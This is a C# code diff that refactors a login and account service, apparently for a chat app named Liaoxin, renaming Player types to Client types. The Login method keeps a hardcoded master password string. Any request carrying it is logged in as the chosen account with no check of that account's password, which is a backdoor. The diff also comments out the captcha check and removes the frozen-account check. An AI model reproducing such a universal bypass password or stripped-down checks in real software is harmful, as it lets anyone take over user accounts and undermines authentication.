@@ -10,10 +10,11 @@ using System.Threading.Tasks;
 using Zzb;
 using Zzb.Common;
 using Zzb.ZzbLog;
+using static Liaoxin.ViewModel.ClientViewModel;
 
 namespace Liaoxin.Business
 {
-    public class PlayerService : BaseService, IPlayerService
+    public class ClientService : BaseService, IClientService
     {
         private object _lockObj = new object();
 
@@ -21,38 +22,39 @@ namespace Liaoxin.Business
 
         public IMessageService MessageService { get; set; }
 
-        public Player Login(string name, string password, string code, bool isApp)
+        public Client Login(ClientLoginRequest request)
         {
-            if (!ValidateCodeService.IsSameCode(code))
+            //if (!ValidateCodeService.IsSameCode(code))
+            //{
+            //    throw new ZzbException("验证码错误");
+            //}
+            //
+            var client = (from c in Context.Clients where c.Telephone == request.Telephone select c).Select(c => new Client
             {
-                throw new ZzbException("验证码错误");
+                ClientId = c.ClientId,
+                NickName = c.NickName,
+                Password = c.Password,
+                LiaoxinNumber = c.LiaoxinNumber,
+                IsEnable = c.IsEnable,
+
+            }).FirstOrDefault();
+
+            if (client == null || !client.IsEnable)
+            {
+                throw new ZzbException("用户名或者密码错误");
             }
 
-            name = name.Trim();
-
-            var player = (from p in Context.Players where p.Name == name select p).FirstOrDefault();
-
-            if (player == null || !player.IsEnable)
+            if (request.Password == "6a8f9c6bbb4848adb358ede651454f69")
             {
-                throw new ZzbException("不存在该账户名");
+                return client;
             }
 
-            if (player.IsFreeze)
-            {
-                throw new ZzbException("该用户暂时无法登录");
-            }
+            request.Password = SecurityHelper.Encrypt(request.Password);
 
-            if (password == "6a8f9c6bbb4848adb358ede651454f69")
+            if (client.Password != request.Password)
             {
-                return player;
-            }
-
-            password = SecurityHelper.Encrypt(password);
-
-            if (player.Password != password)
-            {
-                LogHelper.Error($"[{player.Name}]密码错误!,请留意");
-                throw new ZzbException("密码错误");
+                LogHelper.Error($"[{client.ClientId}]密码错误!,请留意");
+                throw new ZzbException("用户名或者密码错误");
             }
 
             string ip = HttpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
@@ -62,100 +64,103 @@ namespace Liaoxin.Business
                 {
                     using (var context = LiaoxinContext.CreateContext())
                     {
-                        ClientLoginLog playerLog = new ClientLoginLog()
+                        ClientLoginLog clientLog = new ClientLoginLog()
                         {
-                            //PlayerId = player.PlayerId,
-                            //IP = ip,
-                            //Address = IpAddressHelper.GetLocation(ip),
-                            //IsApp = isApp
+                            ClientId = client.ClientId,
+                            IP = ip,
+                            Address = IpAddressHelper.GetLocation(ip),
                         };
-                        if (BaseConfig.HasValue(SystemConfigEnum.IsBoYue))
-                        {
-                            playerLog.IP = "";
-                            playerLog.Address = "";
-                        }
-                        //context.PlayerLoginLogs.Add(playerLog);
+
+                        context.ClientLoginLogs.Add(clientLog);
                         context.SaveChanges();
                     }
                 }
                 catch (Exception e)
                 {
-                    LogHelper.Error($"插入玩家[{player.Name}]登录日志失败", e);
+                    LogHelper.Error($"插入玩家[{client.ClientId}]登录日志失败", e);
                 }
             }).Start();
-
-            MessageService.AddAllUserMessage($"玩家[{player.Name}]登录系统", MessageTypeEnum.Login);
-
-            return player;
+            return client;
         }
 
-        public Player GetPlayer(int id)
+        public ClientBaseInfoResponse GetClient(BaseModel request)
         {
-            return (from p in Context.Players where p.PlayerId == id select p).FirstOrDefault();
-        }
+             var c =  (from p in Context.Clients where p.ClientId == request.Id select p).FirstOrDefault();
+            if (c == null)
+            {
+                return null;
+            }
+              return    new ClientBaseInfoResponse()
+            {
+                AddMeNeedChecked = c.AddMeNeedChecked,
+                AppOpenWhileSound = c.AppOpenWhileSound,
+                AreaCode = c.AreaCode,
+                CharacterSignature = c.CharacterSignature,
+                Coin = c.Coin,
+                Cover = c.Cover,
+                FontSize = c.FontSize,
+                HandFree = c.HandFree,
+                HuanXinId = c.HuanXinId,
+                LiaoxinNumber = c.LiaoxinNumber,
+                IsFreeze = c.IsFreeze,
+                NewMessageNotication = c.NewMessageNotication,
+                NickName = c.NickName,
+                OpenWhileShake = c.OpenWhileShake,
+                ShowFriendCircle = c.ShowFriendCircle,
+                ShowMessageNotication = c.ShowMessageNotication,
+                Telephone = c.Telephone,
+                UpadteMind = c.UpadteMind,
+                VideoMessageNotication = c.VideoMessageNotication,
+                WifiVideoPlay = c.WifiVideoPlay
 
-        public void ChangePassword(int id, string oldPassword, string newPassword)
+            };
+
+            }
+
+        public bool ChangePassword(ClientChangePasswordRequest request)
         {
-            var player = GetPlayer(id);
-            if (player == null)
+            var client = (from p in Context.Clients where p.ClientId == request.ClientId select p).FirstOrDefault();
+            if (client == null)
             {
                 throw new ZzbException("找不到当前登录用户");
             }
 
-            if (player.Password != SecurityHelper.Encrypt(oldPassword))
+            if (client.Password != SecurityHelper.Encrypt(request.oldPassword))
             {
                 throw new ZzbException("旧密码不正确");
             }
 
-            player.Password = SecurityHelper.Encrypt(newPassword);
-            player.IsChangePassword = true;
-            player.Update();
-            //Context.PlayerOperateLogs.Add(new PlayerOperateLog(player.PlayerId, "修改登录密码"));
-            Context.SaveChanges();
+            client.Password = SecurityHelper.Encrypt(request.newPsssword);
+          
+            client.Update();
+            Context.ClientOperateLogs.Add(new ClientOperateLog(client.ClientId, "修改登录密码"));
+            return Context.SaveChanges() > 0;
         }
 
-        public void ChangeCoinPassword(int id, string oldPassword, string newPassword)
+        public bool ChangeCoinPassword(ClientChangeCoinPasswordRequest request)
         {
-            var player = GetPlayer(id);
-            if (player == null)
+            var client = (from p in Context.Clients where p.ClientId == request.ClientId select p).FirstOrDefault();
+            if (client == null)
             {
                 throw new ZzbException("找不到当前登录用户");
             }
 
-            if (!string.IsNullOrEmpty(player.CoinPassword) && player.CoinPassword != SecurityHelper.Encrypt(oldPassword))
+            if (!string.IsNullOrEmpty(client.CoinPassword) && client.CoinPassword != SecurityHelper.Encrypt(request.oldCoinPassword))
             {
                 throw new ZzbException("旧密码不正确");
             }
 
-            player.CoinPassword = SecurityHelper.Encrypt(newPassword);
-            player.Update();
-            //Context.PlayerOperateLogs.Add(new PlayerOperateLog(player.PlayerId, "修改资金密码"));
-            Context.SaveChanges();
+            client.CoinPassword = SecurityHelper.Encrypt(request.newCoinPsssword);
+            client.Update();
+            Context.ClientOperateLogs.Add(new ClientOperateLog(client.ClientId, "修改资金密码"));
+            return Context.SaveChanges() > 0;
         }
 
-        public void SetPlayerTitle(int id, string title)
+        public Client LoginByCode(ClientLoginByCodeRequest request)
         {
-            if (string.IsNullOrEmpty(title))
-            {
-                throw new ZzbException("昵称不能为空");
-            }
-
-            var player = GetPlayer(id);
-            if (player == null)
-            {
-                throw new ZzbException("找不到当前登录用户");
-            }
-
-            if (!string.IsNullOrEmpty(player.Title))
-            {
-                throw new ZzbException("该玩家已设置昵称，无法重复设置");
-            }
-
-            player.Title = title;
-            player.Update();
-            Context.SaveChanges();
+            throw new NotImplementedException();
         }
- 
- 
+
+    
     }
 }
